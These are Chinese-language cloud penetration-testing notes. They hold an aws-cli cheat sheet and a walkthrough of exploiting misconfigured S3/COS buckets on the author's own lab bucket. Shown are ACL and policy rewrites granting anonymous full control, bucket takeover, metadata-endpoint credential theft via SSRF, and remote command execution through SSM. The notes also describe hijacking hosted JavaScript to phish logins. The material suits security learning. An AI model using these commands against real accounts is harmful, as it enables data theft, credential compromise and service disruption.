# 云服务

云服务，顾名思义就是云上的服务，简单的来说就是在云厂商（例如 AWS、阿里云）那里买的服务。

目前国内云厂商有阿里云、腾讯云、华为云、天翼云、Ucloud、金山云等等，国外有亚马逊的 AWS、Google 的 GCP、微软的 Azure 等等。

各个云厂商对云服务的叫法都不统一，这里统一以 AWS 为例。

S3 对象存储`Simple Storage Service`，简单的说就是一个类似网盘的东西，当然跟网盘是有一定区别的。

EC2 即弹性计算服务`Elastic Compute Cloud`，简单的说就是在云上的一台虚拟机。

RDS 云数据库`Relational Database Service`，简单的说就是云上的一个数据库。

IAM 身份和访问管理`Identity and Access Management`，简单的说就是云控制台上的一套身份管理服务，可以用来管理每个子账号的权限。

因为这些原本都放在本地的东西上了云，相应的就会产生对应的安全风险，因为便有了研究的意义。



AWS 全称Amazon web service(亚马逊网络服务)，是亚马逊公司旗下云计算服务平台，为全世界各个国家和地区的客户提供一整套基础设施和云解决方案。

AWS面向用户提供包括弹性计算、存储、数据库、物联网在内的一整套云计算服务，帮助企业降低IT投入和维护成本，轻松上云

从概念是来看，AWS提供了一系列的托管产品，帮助我们在没有物理服务器的情况下，照样可以正常完成软件开发中的各种需求，也就是我们常说的云服务。

比如，

从存储来说，AWS提供了S3 作为对象存储工具，可以帮助我们存储大量的数据，并且S3可以被AWS的其他服务所访问。

从服务器资源来说，AWS提供了EC2作为虚拟化的云服务器，提供各种类型的主机，如计算型、通用型、内存计算型、GPU计算型，等等来满足业务对服务器的需要

在数据库方面，AWS提供了如RDS（包含Mysql、MariaDB、Postgresql）作为关系型存储以及分布式大型关系型数据库Aurora，同时提供了多种Nosql数据库，如DynamoDB等，以及数仓如RedShift

AWS在各个方面的业务需求上，都有对应的产品或者整体的解决方案存在，并且这些产品或者方案都有一个特点，就是全部不需要使用者有任何物理资源，所有的业务统统在AWS上运行，使用者只需要有一天电脑去登录AWS去进行管理操作即可，同时也简化了许多运维的工作量，比如监控、报警等方面，AWS自身就已经集成了很丰富的监控报警功能。

# aws-cli

https://docsgpt.antimetal.com/是aws的ai。



```bash

# aws 的一个全局参数，当此参数使用时，aws 不会使用 aws configure 中的配置
--no-sign-request
#aws的一个全局参数，可以让输出的结果直接打印在终端里而不是在vi
--no-cli-pager


##############    configure    #########
#导出当前的AKSK和token
aws configure export-credentials
aws configure set aws_session_token xxx
##############    configure    #########

###############    s3    ################
aws s3 ls --endpoint-url http://cos.ap-beijing.myqcloud.com s3://testbucket1-1305357004
#递归下载所有文件和文件夹
aws s3 cp s3://hl-it-admin/ ./ --recursive
#递归下载所有文件和文件夹
aws s3 cp s3://hl-it-admin/ ./ --recursive
###############    s3    ################



###############    s3api    #############
#列出目标bucket的所有object
aws s3api  --endpoint-url http://s3.bucket.htb list-objects --bucket adserver
#列出目标bucket的ACl策略
aws s3api  --endpoint-url http://s3.bucket.htb get-bucket-acl --bucket adserver
#写入策略
aws s3api put-bucket-acl --bucket teamssix --access-control-policy file://acl.json
#获取bucket的策略
aws s3api get-bucket-policy --bucket hugelogistics-data --no-cli-pager --output text|python -m json.tool
#获取存储桶的版本信息
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request --no-cli-pager
#列一下所有object的版本信息
aws s3api list-object-versions --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request  --no-cli-pager
#获取object
aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 --key static/js/auth.js --version-id qgWpDiIwY05TGdUvTnGJSH49frH_7.yh auth.js --no-sign-request
###############    s3api    #############



###############    sts    #############
#返回有其凭证用于调用本操作的 IAM 用户或角色的详细信息，包括用户ID、账户ID和用户ARN，等同于whoami
aws sts get-caller-identity

#可以允许用户临时扮演其他角色。通过assume-role，用户可以获取到被扮演角色所拥有的权限，并且可以在一定时间范围内使用这些权限。这种方式可以确保用户在需要时能够安全地访问特定资源。assume的--web-identity-token通过get-open-id-token获取
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --web-identity-token "xx"
#??
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name feng  --external-id 37911 --no-cli-pager
#根据AKid查找对应的用户的account id，configure自己的aws aksk后查询
aws sts get-access-key-info --access-key-id AKIAWHEOTHRFVXYV44WP
###############    sts    #############




###############    iam    #############
aws iam get-user
#枚举可能属于的所有组
aws iam list-groups-for-user --user-name dev01
#列出附加的用户策略
aws iam list-attached-user-policies --user-name dev01
#列出策略AmazonGuardDutyReadOnlyAccess的版本，--policy-arn从list-attached-user-policies中获得。Amazon 和客户管理的策略可以有多个版本，允许您保留、查看和回滚到以前的策略版本。内联策略不支持版本控制。
aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess
#获取默认policy的简单信息，例如版本啥的
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess
#获得对应版本的policy的详细信息
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess --version-id v3
#列出内联策略，AWS IAM 中的内联策略是直接嵌入到单个 IAM 用户、组或角色中的策略，并且不能单独管理或重复使用。
aws iam list-user-policies --user-name dev01
#获得内联策略
aws iam get-user-policy --user-name dev01 --policy-name S3_Access
#获取有关role的信息
aws iam get-role --role-name BackendDev
#获取附加的角色policy
aws iam list-attached-role-policies --role-name BackendDev
#列出role的内联策略
aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
#给用户赋予某个权限
aws iam attach-user-policy --user-name xxx --policy-arn xxx
#修改策略的默认版本
aws iam set-default-policy-version –policy-arn <policy-arn> –version-id v5 –profile rollbackuser
###############    iam    #############


###############    ec2     #############
#检测公有快照
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate
###############    ec2     #############

###############    dynamodb    ##############
#列出当前所有的dynamodb tables
aws dynamodb list-tables --no-cli-pager
#表的信息
aws dynamodb describe-table --table-name analytics_app_users --no-cli-pager
#列出表的具体内容
aws dynamodb scan --table-name analytics_app_users > output.json
aws dynamodb describe-endpoints --no-cli-pager
###############    dynamodb    ##############



###############     cognito-identity    ##############
#cognito-identity是对Federated  Identities(即Identity pools池的操作)

#获取一个cognito的identity-id。此API是公开API，无需凭据。此步骤需要知道identity-pool-id
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign-request --no-cli-pager
#返回提供的identity-ID的credentials
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --no-sign-request --no-cli-pager
#用已知的Cognito identity-id得到一个open id
aws cognito-identity get-open-id-token --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --no-sign-request --no-cli-pager
###############     cognito-identity    ##############


###############     cognito-idp    ###############
#cognito-idp即对user pool操作的一些api
#注册
aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --password "FENGfeng123@@@" --user-attributes Name="email",Value="sulishi141592653@gmail.com"
#确认注册，code发送到邮箱
aws cognito-idp confirm-sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --confirmation-code 497147

#即sign-in
aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id 16f1g98bfuj9i0g3f8be36kkrl --auth-parameters USERNAME=feng1,PASSWORD=FENGfeng123@@@ --no-cli-pager
###############     cognito-idp    ###############


###############     Amazon Macie    ###############
#返回可公开访问的存储桶
aws macie2 describe-buckets --region eu-west-2 --criteria '{"publicAccess.effectivePermission":{"eq":["PUBLIC"]}}' --query 'buckets[*].{BucketName: bucketName, AllowsPublicReadAccess: publicAccess.permissionConfiguration.bucketLevelPermissions.bucketPolicy.allowsPublicReadAccess}' --output table
#返回存储桶的公开可读和公开可写的情况
aws macie2 describe-buckets --region eu-west-2 --criteria '{"publicAccess.effectivePermission":{"eq":["PUBLIC"]}}' --query 'buckets[*].{BucketName: bucketName, AllowsPublicReadAccess: publicAccess.permissionConfiguration.bucketLevelPermissions.bucketPolicy.allowsPublicReadAccess, AllowsPublicWriteAccess: publicAccess.permissionConfiguration.bucketLevelPermissions.bucketPolicy.allowsPublicWriteAccess}' --output table
#列出所有的finding-ids
aws macie2 list-findings --region eu-west-2 --query 'findingIds'
#获取对应的finding
aws macie2 get-findings --region eu-west-2 --finding-ids a9b499b2e269483ae18a91b1dc5423eb --query 'findings[*].{Type: type, Resource: resourcesAffected.s3Bucket.name, S3Object: resourcesAffected.s3Object.key}' --output table
#列出所有的findings
aws macie2 get-findings --region eu-west-2 --finding-ids $(aws macie2 list-findings --region eu-west-2 --query 'findingIds[]' --output text) --query 'findings[*].{Type: type, Resource: resourcesAffected.s3Bucket.name, S3Object: resourcesAffected.s3Object.key}' --output table
#仅显示findings中暴露了Credentials的finding
aws macie2 get-findings --region eu-west-2 --finding-ids $(aws macie2 list-findings --region eu-west-2 --query 'findingIds[]' --output text) --query 'findings[?contains(type, `Credentials`)].{Type: type, Resource: resourcesAffected.s3Bucket.name, S3Object: resourcesAffected.s3Object.key}' --output table
###############     Amazon Macie    ###############


###############     lambda    ###############
#列出所有函数
aws lambda list-functions --no-cli-pager
#调用函数
aws lambda invoke --function-name crew_administration_data  output.txt
#查看函数的详细信息
aws lambda get-function --function-name huge-logistics-status
#带参数的调用
aws lambda invoke --function-name huge-logistics-status --payload 'eyJ0YXJnZXQiOiJodHRwczovL3d3dy5iYWlkdS5jb20ifQ=='  output2.txt
###############     sqs    ###############
#列出所有的消息列队
aws sqs list-queues --no-cli-pager
#接收消息
aws sqs receive-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attribute-names All --no-cli-pager
###############     sqs    ###############


###############     ecs    ###############
#列举集群
aws ecs list-clusters
#列举集群内的任务
aws ecs list-tasks --cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster --query taskArns
#查看任务
aws ecs describe-tasks –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster –tasks
#列举集群内实例
aws ecs list-container-instances –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster
#暂停ec2实例
aws ecs update-container-instances-state –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster –container-instances arn:aws:ecs:us-east-1:818529845881:container-instance/ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster/603439c72f5040b2834672fd312593d3 –status DRAINING
###############     ecs    ###############

###############     rds    ###############
#创建数据库快照
aws rds create-db-snapshot –db-instance-identifier cg-rds-instance-codebuild-secrets-cgidrhg45g9k0y –db-snapshot test-shot
#查看子网subnet
aws rds describe-db-subnet-groups
#列举安全组
aws ec2 describe-security-groups
#根据快照创建新的数据库,同时要有一个开放了数据库端口的安全组，安全组从上一步获得
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier newDB1 --db-snapshot-identifier test-shot --db-subnet-group-name cloud-goat-rds-subnet-group-codebuild_secrets_cgidrhg45g9k0y --publicly-accessible --vpc-security-group-ids sg-0665d973c6ded2585
#列出rds实例
aws rds describe-db-instances
#列出可公开访问的rds的identifier
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'
#修改密码
aws rds modify-db-instance –db-instance-identifier newdb1 –master-user-password feng 

###############     rds    ###############
```





# S3

AWS S3 全名是 Simple Storage Service，简便的存储服务。它：

1. 提供了统一的接口 REST/SOAP 来统一访问任何数据
2. 对 S3 来说，存在里面的数据就是对象名（键），和数据（值）
3. 不限量，单个文件最高可达 5TB
4. 高速。每个 bucket 下每秒可达 3500 PUT/COPY/POST/DELETE 或 5500 GET/HEAD 请求
5. 具备版本，权限控制能力
6. 具备数据生命周期管理能力

## 基本概念

**Bucket**

要存储数据在 S3 里，首先我们要建立一个 Bucket。Bucket 默认是不公开的。

Bucket 有几个特点：

- 命名需全球唯一。每个帐号默认可建 100 个，可申请至最多 1000 个
- 创建者的拥有权不可转让，也不可以从一个 Region 转去别的 Region
- 没有对象存储数量限制

Bucket 就像是电脑里面的某一个顶层分区。所有的对象都必须保存在某一个 bucket 下面。



**Object**

Bucket 里面每一个存储的数据就是对象，由对象名（键），和数据（值）组成。

对象的键（Key）可以很长，甚至按照一定前缀格式来指定，从而模拟文件夹的层级结构，比如 `Photo/Family/2020-01-25-new-year/altogether.jpg`。

每一个对象其实还包含一些元信息（Meta-data），包括系统指定的文件类型，创建时间，加密算法等，和用户上传时指定的元信息。元信息在对象创建后都无法更改。

我们也可以为对象指定最多 10个标签（Tag），标签的键和值的最大长度是 128 和 256 个字符。这个标签和元信息有什么不同呢？标签是可以修改和新增的。它最大的好处，是可以结合权限控制，生命周期管理，和数据分析等使用。

单个文件上传最大是 5GB。超过的话，需要使用 multipart upload API。最大支持 5TB。

**一致性特性**

对程序员来说，这么一个类似数据库的东西，肯定需要关心它的读写特性和一致性模型。

- 没有锁的功能。如果同时（几乎）发起两个更新对象的 PUT 请求，键相同，那么，以到达 S3 时间先后处理更新。
- 不同对象的更新，没法做到原子操作。
- 对全新的对象来说，它是 Read-after-Write Consistency 的。也就是写了之后马上读，肯定就是你刚才上传的数据。
- 如果你要更新数据，那就变成 Eventual Consistency 了。也就是说，更新后马上读，可能是旧的数据，也可能是新的。

这里有一个比较坑的地方是，如果你先调用 GET 请求访问一个不存在的资源，S3 告诉你它不存在。然后你马上上传数据，再调用一个 GET，这时候是有可能拿不回来的。



**版本控制：**
Amazon S3 版本控制是一项可以在 S3 存储桶上启用的功能，以将对象的多个版本（包括所有写入和删除）保留在同一存储桶中。一旦为存储桶启用了版本控制，就无法暂停它，只能永久禁用（并且此时已进行版本控制的对象将保持其版本）。

## aws cli

s3:

```shell
#需要用s3://协议
aws s3 [command] <arg>
cp
ls
mb
mv
presign
rb
rm
sync
website

aws s3 ls --endpoint-url http://cos.ap-beijing.myqcloud.com s3://testbucket1-1305357004
```

s3api:

```shell
#列出目标bucket的所有object
aws s3api  --endpoint-url http://s3.bucket.htb list-objects --bucket adserver
#列出目标bucket的ACl策略
aws s3api  --endpoint-url http://s3.bucket.htb get-bucket-acl --bucket adserver

#写入策略
aws s3api put-bucket-acl --bucket teamssix --access-control-policy file://acl.json

#等等
```







```bash
# aws 的一个全局参数，当此参数使用时，aws 不会使用 aws configure 中的配置
--no-sign-request
```





## 渗透

参考https://zone.huoxian.cn/d/907-aws-s3

![image-20231016210355648](AWS.assets/image-20231016210355648.png)

首先创建腾讯云的s3

选择腾讯云创建s3。亚马逊的注册存在奇怪的问题。

点击创建存储桶：

![image-20231016192418499](AWS.assets/image-20231016192418499.png)

![image-20231016192445650](AWS.assets/image-20231016192445650.png)

地域会影响请求的域名，完整的名称是testbucket2--1305357004，为了复现漏洞采取公有读写。

![image-20231016192536556](AWS.assets/image-20231016192536556.png)

![image-20231016192546005](AWS.assets/image-20231016192546005.png)

拿子用户访问：

![image-20231016192754429](AWS.assets/image-20231016192754429.png)

然后配置aws-cli：

```bash
aws configure
AWS Access Key ID [****************Hctx]:
AWS Secret Access Key [****************Znxv]:
Default region name [None]:
Default output format [json]:
```

需要设定`region name`为空，执行命令时指定`--endpoint-url http://cos.ap-beijing.myqcloud.com`即可



### 1.Bucket爆破

当不知道 Bucket 名称的时候，可以通过爆破获得 Bucket 名称，这有些类似于目录爆破，只不过目录爆破一般通过状态码判断，而这个通过页面的内容判断。

例如存在的Bucket的url为https://testbucket1-1305357004.cos.ap-beijing.myqcloud.com/

例如访问https://aaatestbucket1-1305357004.cos.ap-beijing.myqcloud.com/

当 Bucket 不存在时有两种返回情况，分别是 InvalidBucketName 和 NoSuchBucket。

当 Bucket 存在时也会有两种情况，一种是列出 Object，另一种是返回 AccessDenied。





### 2.Bucket接管

发现一个域显示NoSuchBucket，则在aws上创建对应名称的s3来接管。

（腾讯云不行，因为腾讯云创建s3的时候自己输入name后面还会带一串id）

### 3.S3任意文件上传

如果对象存储配置不当，比如公共读写，那么可能就会造成任意文件上传与文件覆盖。



```bash
#查看目标Bucket的ACL
aws s3api get-bucket-acl --endpoint-url http://cos.ap-beijing.myqcloud.com  --bucket testbucket1-1305357004
```

得到：

```json
{
    "Owner": {
        "DisplayName": "qcs::cam::uin/100018278953:uin/100018278953",
        "ID": "qcs::cam::uin/100018278953:uin/100018278953"
    },
    "Grants": [
        {
            "Grantee": {
                "Type": "Group",
                "URI": "http://cam.qcloud.com/groups/global/AllUsers"
            },
            "Permission": "READ"
        },
        {
            "Grantee": {
                "Type": "Group",
                "URI": "http://cam.qcloud.com/groups/global/AllUsers"
            },
            "Permission": "WRITE"
        },
        {
            "Grantee": {
                "DisplayName": "qcs::cam::uin/100018278953:uin/100033797384",
                "ID": "qcs::cam::uin/100018278953:uin/100033797384",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

参考ACL权限：

![image-20231016193525175](AWS.assets/image-20231016193525175.png)

所以上面ACL的意思是，所有人对存储桶可读可写，但是只有一个指定的用户可读可写存储桶的ACL。

因此此存储桶就是公共读写的，尝试上传文件：

```bash
curl -T 1.txt https://testbucket1-1305357004.cos.ap-beijing.myqcloud.com/1.txt
```

上传成功：

![image-20231016193900469](AWS.assets/image-20231016193900469.png)

### 4.Bucket ACL可写

尝试列对象：

```bash
aws s3api list-objects --endpoint-url http://cos.ap-beijing.myqcloud.com  --bucket testbucket1-1305357004
```

如果被拒绝的话，查看目标Bucket的ACL：

```bash
#查看目标Bucket的ACL
aws s3api get-bucket-acl --endpoint-url http://cos.ap-beijing.myqcloud.com  --bucket testbucket1-1305357004
```

如果可写存储桶的ACL，则可以直接将策略写入：

```bash
aws s3api put-bucket-acl --bucket testbucket1-1305357004 --access-control-policy file://acl.json
```

acl.json：

```json
{
    "Owner": {
        "DisplayName": "qcs::cam::uin/100018278953:uin/100018278953",
        "ID": "qcs::cam::uin/100018278953:uin/100018278953"
    },
    "Grants": [
	{
            "Grantee": {
                "Type": "Group", 
                "URI": "http://cam.qcloud.com/groups/global/AllUsers"
            }, 
            "Permission": "FULL_CONTROL"
        } 
    ]
}
```

即可实现任何人都对存储桶有完全控制权。

### 5.Object ACL可写

```bash
aws s3 ls --endpoint-url http://cos.ap-beijing.myqcloud.com s3://testbucket1-1305357004
```



尝试读取Object：

```bash
aws s3 cp s3://testbucket1-1305357004/1.txt ./ --endpoint-url http://cos.ap-beijing.myqcloud.com
```

提示forbiden话说，读取一下Object的ACL：

```bash
aws s3api get-object-acl --bucket testbucket1-1305357004 --endpoint-url http://cos.ap-beijing.myqcloud.com  --key  1.txt
```

得到：

```json
{
    "Owner": {
        "DisplayName": "qcs::cam::uin/100018278953:uin/100018278953",
        "ID": "qcs::cam::uin/100018278953:uin/100018278953"
    },
    "Grants": [
        {
            "Grantee": {
                "DisplayName": "qcs::cam::uin/100018278953:uin/100018278953",
                "ID": "qcs::cam::uin/100018278953:uin/100018278953",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

显示指定的用户有完全控制权。如果是所有用都可读可写ACL的话，就可以修改Object的ACL。

acl.json:

```json
{
    "Owner": {
        "DisplayName": "qcs::cam::uin/100018278953:uin/100018278953",
        "ID": "qcs::cam::uin/100018278953:uin/100018278953"
    },
    "Grants": [
	{
            "Grantee": {
                "Type": "Group", 
                "URI": "http://cam.qcloud.com/groups/global/AllUsers"
            }, 
            "Permission": "FULL_CONTROL"
        } 
    ]
}
```

写入acl：

```bash
aws s3api put-object-acl --bucket testbucket1-1305357004 --endpoint-url http://cos.ap-beijing.myqcloud.com --key 1.txt --access-control-policy file://acl.json
```



之后就可以读取Object了。

### 6.Bucket策略可写



(这个比较鸡肋，利用前提是需要存储桶所有者账户的身份才行，不过尝试发现使用存储桶子账号的 AK 也可以读取。)

#### 修改策略获得敏感文件

获取bucket的策略：

```bash
aws s3api get-bucket-policy --bucket testbucket1-1305357004 --endpoint-url http://cos.ap-beijing.myqcloud.com --output text|python -m json.tool

#需要改成--output text是因为json得到的不是原本的policy
```

得到：

```json
{
    "Statement": [
        {
            "Action": [
                "name/cos:HeadBucket",
                "name/cos:GetObject",
                "name/cos:HeadObject",
                "name/cos:OptionsObject"
            ],
            "Effect": "Deny",
            "Principal": {
                "qcs": [
                    "qcs::cam::anyone:anyone"
                ]
            },
            "Resource": [
                "qcs::cos:ap-beijing:uid/1305357004:testbucket1-1305357004/1.txt"
            ],
            "Sid": "policy1"
        }
    ],
    "version": "2.0"
}
```

禁止了所有人读取1.txt，但是没禁止对Bucket的策略进行读写，将Deny改成Accept。



```bash
aws s3api put-bucket-policy --bucket testbucket1-1305357004 --endpoint-url http://cos.ap-beijing.myqcloud.com  --policy file://policy.json
```

即可变成允许：

![image-20231016202950968](AWS.assets/image-20231016202950968.png)

即可访问1.txt



#### 修改网站引用的s3资源进行钓鱼

如果一个网站引用s3上的资源比如js，而s3我们可读可写的话，就可以修改成恶意的js代码，比如比如用户登录的时候form的数据会提交给我们的服务器上来获取用户名密码。





#### 修改 Bucket 策略为 Deny 使业务瘫痪

同理，修改策略为Deny使得网站无法引用资源而瘫痪。

### 7.Bucket Object遍历

修改Bucket的Policy为：

```bash
{

  "Statement": [

    {

      "Action": [

        "name/cos:GetBucket",

        "name/cos:GetBucketObjectVersions",

        "name/cos:GetBucketIntelligentTiering",

        "name/cos:HeadBucket",

        "name/cos:ListMultipartUploads",

        "name/cos:ListParts",

        "name/cos:GetObject",

        "name/cos:HeadObject",

        "name/cos:OptionsObject"

      ],

      "Effect": "Allow",

      "Principal": {

        "qcs": [

          "qcs::cam::anyone:anyone"

        ]

      },

      "Resource": [

        "qcs::cos:ap-beijing:uid/1305357004:testbucket1-1305357004/*"

      ],

      "Sid": "1"

    }

  ],

  "version": "2.0"

}
```

即可使得Bucket Object遍历。

![image-20231016203737469](AWS.assets/image-20231016203737469.png)





### 8.总结

在实战中，可以去尝试读取对方的策略，如果对方策略没做读取的限制，也许就能读到。

其次在进行信息收集的时候，可以留意一下对方可能会使用什么策略，然后再去尝试访问看看那些原本是 AccessDenied 的对象是否能够正常访问。

具体的策略如何配置，可以在腾讯云的s3上面配置出来然后读取json就知道json该怎么写了。







# EC2 弹性服务

EC2 即弹性计算服务`Elastic Compute Cloud`，简单的说就是在云上的一台虚拟机。

## 初始访问

### 凭据泄漏

云场景下的凭证泄露可以分成以下几种：

- 控制台账号密码泄露，例如登录控制台的账号密码
- 临时凭证泄露
- 访问密钥泄露，即 AccessKeyId、SecretAccessKey 泄露
- 实例登录凭证泄露，例如 AWS 在创建 EC2 生成的证书文件遭到泄露

对于这类凭证信息的收集，一般可以通过以下几种方法进行收集：

- Github 敏感信息搜索
- 反编译目标 APK、小程序
- 目标网站源代码泄露



### 元数据

元数据服务是一种提供查询运行中的实例内元数据的服务，当实例向元数据服务发起请求时，该请求不会通过网络传输，如果获得了目标 EC2 权限或者目标 EC2 存在 SSRF 漏洞，就可以获得到实例的元数据。



**为了方便运行在EC2上的程序访问AWS中的其它资源，可以配置instance profile来给EC2实例绑定一个角色，这样运行在实例上的所有程序都有绑定角色配置的权限。metadata请求的也就是EC2绑定角色权限的一个凭据。**

**这就是AWS中资源的特殊性，是资源的同时，也是一个AWS中的一个虚拟用户。**

**除了EC2，AWS中其它服务lambda/api-getway/ECS等均可以绑定角色。**



在 AWS 下的元数据地址为：`http://169.254.169.254/latest/meta-data` 或者 `http://instance-data/latest/meta-data`，不同的厂商可能会不一样：

```shell
#aws
http://169.254.169.254/latest/meta-data

#packet
https://metadata.packet.net/userdata

#google

http://metadata.google.internal/computeMetadata/v1beta1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

#orcale

http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

#alibaba

http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id

#tencent
http://metadata.tencentyun.com/latest/meta-data/
```



通过访问元数据的 `/iam/security-credentials/<rolename>` 路径可以获得目标的临时凭证，进而接管目标服务器控制台账号权限，前提是目标需要配置 IAM 角色才行。

先访问`/iam/security-credentials/`获得rolename，然后访问`/iam/security-credentials/<rolename>`即可。



下面是价值较高的元数据：

```bash
mac    实例 MAC 地址
hostname    实例主机名
iam/info    获取角色名称
local-ipv4    实例本地 IP
public-ipv4    实例公网 IP
instance-id    实例 ID
public-hostname    接口的公有 DNS (IPv4)
placement/region    实例的 AWS 区域
public-keys/0/openssh-key    公有密钥
/iam/security-credentials/<rolename>    获取角色的临时凭证
```





不过官方为了增强Metadata安全性，推出了IMDSv2，V2版本服务请求元数据要先PUT获取Token再带token请求，在一定程度上缓解了公有云环境下SSRF的危害:

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```



### 账号劫持

如果云厂商的控制台存在漏洞的话，用户账号也会存在一定的风险。

例如 AWS 的控制台曾经出现过一些 XSS 漏洞，攻击者就可能会使用这些 XSS 漏洞进行账号劫持，从而获得目标云服务器实例的权限。



### 恶意镜像

AWS 在创建实例的时候，用户可以选择使用公共镜像或者自定义镜像，如果这些镜像中有恶意的镜像，那么目标使用该镜像创建实例就会产生风险。

在使用 AWS 命令行时应该确保自己使用的是不是最新版的 AWS 命令行，同时确保从可信的来源去获取 Amazon 系统镜像。

### 其他的初始访问方法

通过云服务上的应用程序漏洞进入目标实例。



## 命令执行

### 接管控制台

```bash
cf tencent console
```

然后登录上对应的控制台上执行命令即可。



### 命令行

aws-cli：

```bash
#没aws没测过，国内的云还是cf更方便一些。

#列出实例id
aws ec2 describe-instances --filters "Name=instance-type,Values=t2.micro" --query "Reservations[].Instances[].InstanceId"

#在实例执行命令
aws ssm send-command \
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --parameters commands=ifconfig \
    --output text
    
#获取执行结果
aws ssm list-command-invocations \
    --command-id $sh-command-id \
    --details
```



cf:

```bash
cf tencent cvm ls --flushCache
[2023-10-17 10:47:38]  INFO 正在 ap-guangzhou 区域中查找实例 (Looking for instances in the ap-guangzhou region)
[2023-10-17 10:47:40]  INFO 正在 ap-shanghai 区域中查找实例 (Looking for instances in the ap-shanghai region)
[2023-10-17 10:47:40]  INFO 在 ap-shanghai 区域下找到 1 个实例 (Found 1 instances in ap-shanghai region)
[2023-10-17 10:47:42]  INFO 正在 ap-nanjing 区域中查找实例 (Looking for instances in the ap-nanjing region)
[2023-10-17 10:47:43]  INFO 正在 ap-beijing 区域中查找实例 (Looking for instances in the ap-beijing region)
[2023-10-17 10:47:44]  INFO 正在 ap-chengdu 区域中查找实例 (Looking for instances in the ap-chengdu region)
[2023-10-17 10:47:46]  INFO 正在 ap-chongqing 区域中查找实例 (Looking for instances in the ap-chongqing region)
[2023-10-17 10:47:46]  INFO 正在 ap-hongkong 区域中查找实例 (Looking for instances in the ap-hongkong region)
[2023-10-17 10:47:48]  INFO 正在 ap-seoul 区域中查找实例 (Looking for instances in the ap-seoul region)
[2023-10-17 10:47:51]  INFO 正在 ap-tokyo 区域中查找实例 (Looking for instances in the ap-tokyo region)
[2023-10-17 10:47:53]  INFO 正在 ap-singapore 区域中查找实例 (Looking for instances in the ap-singapore region)
[2023-10-17 10:47:56]  INFO 正在 ap-bangkok 区域中查找实例 (Looking for instances in the ap-bangkok region)
[2023-10-17 10:47:59]  INFO 正在 ap-jakarta 区域中查找实例 (Looking for instances in the ap-jakarta region)
[2023-10-17 10:48:01]  INFO 正在 na-siliconvalley 区域中查找实例 (Looking for instances in the na-siliconvalley region)
[2023-10-17 10:48:03]  INFO 正在 eu-frankfurt 区域中查找实例 (Looking for instances in the eu-frankfurt region)
[2023-10-17 10:48:05]  INFO 正在 ap-mumbai 区域中查找实例 (Looking for instances in the ap-mumbai region)
[2023-10-17 10:48:07]  INFO 正在 na-ashburn 区域中查找实例 (Looking for instances in the na-ashburn region)
[2023-10-17 10:48:09]  INFO 正在 sa-saopaulo 区域中查找实例 (Looking for instances in the sa-saopaulo region)
[2023-10-17 10:48:11]  INFO 正在 na-toronto 区域中查找实例 (Looking for instances in the na-toronto region)
+-----------+-----------------------+--------------------------+------------------------------+--------------------+---------------+----------------------+---------------------+---------------------+
| 序号 (SN) | 实例 ID (INSTANCE ID) | 实例名称 (INSTANCE NAME) |      系统名称 (OS NAME)      | 系统类型 (OS TYPE) | 状态 (STATUS) | 私有 IP (PRIVATE IP) | 公网 IP (PUBLIC IP) | 区域 ID (REGION ID) |
+-----------+-----------------------+--------------------------+------------------------------+--------------------+---------------+----------------------+---------------------+---------------------+
|     1     |     xxx      | xxx  | Ubuntu Server 18.04 LTS 64位 |       linux        |    RUNNING    |      172.17.0.6      |    xxx    |    ap-shanghai-5    |
+-----------+-----------------------+--------------------------+------------------------------+--------------------+---------------+----------------------+---------------------+---------------------+
CVM 资源 (CVM resources)

feng at fengs-MacBook-Pro.local in [~/github/CTF/AWS]  on git:main ✗  987e539c "commit"
10:48:11 › cf tencent cvm exec -c whoami
? 选择一个实例 (Choose a instance):  ins-cqke0rtt (Ubuntu Server 18.04 LTS 64位)

ins-cqke0rtt > whoami

root

```



## 权限维持

1.用户数据

